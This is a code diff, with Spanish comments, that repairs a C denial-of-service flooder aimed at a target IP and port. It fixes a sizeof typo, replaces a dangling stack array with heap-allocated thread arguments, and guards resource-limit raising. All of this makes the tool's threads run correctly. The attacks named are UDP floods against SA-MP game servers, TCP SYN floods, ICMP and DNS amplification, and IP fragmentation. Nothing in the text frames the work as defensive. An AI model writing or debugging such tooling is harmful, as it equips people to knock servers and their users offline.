@@ -414,7 +414,7 @@ void* fragmentation_attack(void* args) {
     struct custom_ip_header *ip_hdr = (struct custom_ip_header *)packet;
     struct custom_udp_header *udp_hdr = (struct custom_udp_header *)(packet + sizeof(struct custom_ip_header));
     char *data = packet + sizeof(struct custom_ip_header) + sizeof(struct custom_udp_header);
-    int data_size = MAX_PACKET_SIZE - sizeof(struct custom_ip_header) - sizeof(struct_custom_udp_header);
+    int data_size = MAX_PACKET_SIZE - sizeof(struct custom_ip_header) - sizeof(struct custom_udp_header);  // Corregido aquí
     
     // Configurar dirección del objetivo
     memset(&target_addr, 0, sizeof(target_addr));
@@ -614,11 +614,13 @@ int main(int argc, char *argv[]) {
         exit(1);
     }
     
-    // Aumentar límites de recursos
+    // Aumentar límites de recursos (solo en Unix)
+    #ifdef __unix__
     struct rlimit rl;
     rl.rlim_cur = RLIM_INFINITY;
     rl.rlim_max = RLIM_INFINITY;
     setrlimit(RLIMIT_NOFILE, &rl);
+    #endif
     
     char *target_ip = argv[1];
     int target_port = atoi(argv[2]);
@@ -645,35 +647,55 @@ int main(int argc, char *argv[]) {
     
     // Crear hilos de ataque UDP SA-MP
     for (int i = 0; i < udp_threads; i++) {
-        char *args[4] = {target_ip, argv[2], argv[3], (char*)malloc(20)};
+        char **args = malloc(sizeof(char*) * 4);
+        args[0] = target_ip;
+        args[1] = argv[2];
+        args[2] = argv[3];
+        args[3] = malloc(20);
         sprintf(args[3], "%d", i);
         pthread_create(&threads[i], NULL, udp_samp_attack, args);
     }
     
     // Crear hilos de ataque TCP SYN
     for (int i = udp_threads; i < udp_threads + tcp_threads; i++) {
-        char *args[4] = {target_ip, argv[2], argv[3], (char*)malloc(20)};
+        char **args = malloc(sizeof(char*) * 4);
+        args[0] = target_ip;
+        args[1] = argv[2];
+        args[2] = argv[3];
+        args[3] = malloc(20);
         sprintf(args[3], "%d", i);
         pthread_create(&threads[i], NULL, tcp_syn_attack, args);
     }
     
     // Crear hilos de ataque ICMP
     for (int i = udp_threads + tcp_threads; i < udp_threads + tcp_threads + icmp_threads; i++) {
-        char *args[4] = {target_ip, argv[2], argv[3], (char*)malloc(20)};
+        char **args = malloc(sizeof(char*) * 4);
+        args[0] = target_ip;
+        args[1] = argv[2];
+        args[2] = argv[3];
+        args[3] = malloc(20);
         sprintf(args[3], "%d", i);
         pthread_create(&threads[i], NULL, icmp_amplification_attack, args);
     }
     
     // Crear hilos de ataque de fragmentación
     for (int i = udp_threads + tcp_threads + icmp_threads; i < udp_threads + tcp_threads + icmp_threads + frag_threads; i++) {
-        char *args[4] = {target_ip, argv[2], argv[3], (char*)malloc(20)};
+        char **args = malloc(sizeof(char*) * 4);
+        args[0] = target_ip;
+        args[1] = argv[2];
+        args[2] = argv[3];
+        args[3] = malloc(20);
         sprintf(args[3], "%d", i);
         pthread_create(&threads[i], NULL, fragmentation_attack, args);
     }
     
     // Crear hilos de ataque de amplificación DNS
     for (int i = udp_threads + tcp_threads + icmp_threads + frag_threads; i < THREAD_COUNT; i++) {
-        char *args[4] = {target_ip, argv[2], argv[3], (char*)malloc(20)};
+        char **args = malloc(sizeof(char*) * 4);
+        args[0] = target_ip;
+        args[1] = argv[2];
+        args[2] = argv[3];
+        args[3] = malloc(20);
         sprintf(args[3], "%d", i);
         pthread_create(&threads[i], NULL, dns_amplification_attack, args);
     }
@@ -714,4 +736,3 @@ int main(int argc, char *argv[]) {
     
     return 0;
 }
-        
